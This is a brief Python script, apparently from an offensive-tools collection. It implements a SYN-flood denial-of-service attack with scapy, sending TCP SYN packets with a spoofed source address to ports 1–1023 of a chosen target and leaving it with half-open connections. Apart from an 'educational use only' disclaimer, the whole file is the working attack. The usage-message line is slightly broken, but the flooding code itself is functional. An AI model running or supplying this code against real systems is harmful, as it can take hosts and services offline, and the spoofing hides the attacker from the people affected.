# !/usr/bin/python

# This tool is for educational use only!

# Description: A DOS-Attack (Denial of Service) where TCP Packets are sent and
# not confirmed again (destination computer will be left in "Half Open" connection state)
# To prevent getting DOS'ed by ourselfe we use IP spoofing.

# Requirements: scapy and root privileges

import sys
from scapy.all import srflood, IP, TCP

if len(sys.argv) < 3:
  print "{0} <spoofed_source_ip> <target>".sys.argv[0]
  sys.exit(1)

packet = IP(src=sys.argv[1], dst=sys.argv[2]) / \
  TCP(dport=range(1, 1024), flags="S")

srflood(packet, store=0)
